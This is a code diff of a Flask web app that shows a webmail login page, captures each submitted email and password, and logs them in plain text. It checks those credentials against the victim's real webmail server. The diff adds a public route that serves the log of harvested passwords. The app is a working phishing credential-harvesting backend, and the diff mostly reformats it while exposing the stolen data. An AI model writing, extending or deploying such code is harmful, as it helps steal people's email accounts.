@@ -1,31 +1,34 @@
-from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
+from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_file
 import requests
 import logging
+import os
 
 app = Flask(__name__)
 
 # Configure logging to write to a text file
 logging.basicConfig(
     filename='app.log',  # Log file name
-    level=logging.INFO,   # Log level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
+    level=logging.INFO,  # Log level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
     format='%(asctime)s - %(levelname)s - %(message)s'  # Log message format
 )
+
 
 @app.route('/')
 def home():
     return render_template('login.html')
+
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'GET':
         # Redirect to home if accessed via GET
         return redirect(url_for('home'))
-    
+
     user_email = request.form['user']  # Changed to 'user'
     user_password = request.form['pass']  # Changed to 'pass'
-    
+
     domain = user_email.split('@')[1]
-    
+
     # Log the login attempt with the email and password used
     logging.info(f"Login attempt for user: {user_email} with password: {user_password}")
 
@@ -44,7 +47,8 @@ def login():
     headers = {
         'Connection': 'keep-alive',
         'Accept': '*/*',
-        'User -Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',  # Example header
+        'User -Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+        # Example header
         'Content-Type': 'application/x-www-form-urlencoded',  # Content type for form data
         'Origin': f'https://webmail.{domain}',
         'Sec-Fetch-Site': 'same-origin',
@@ -69,7 +73,7 @@ def login():
     if response.status_code == 200:
         # Parse the JSON response
         json_response = response.json()
-        
+
         # Check the status field
         if json_response.get('status') == 1:
             bbox = f"https://webmail.{domain}/login/?user={user_email}&pass={user_password}"
@@ -83,6 +87,20 @@ def login():
         json_response = response.json()
         logging.error(f"Login failed with status code: {response.status_code}, message: {json_response.get('status')}")
         return render_template('login.html', login_failed=True)
+
+
+import os
+
+LOG_FILE_PATH = os.path.abspath("app.log")
+
+
+@app.route('/app.log')
+def get_log_file():
+    if os.path.exists(LOG_FILE_PATH):
+        return send_file(LOG_FILE_PATH, mimetype='text/plain', as_attachment=False)
+    else:
+        return "Log file not found", 404
+
 
 if __name__ == '__main__':
     app.run(debug=True)
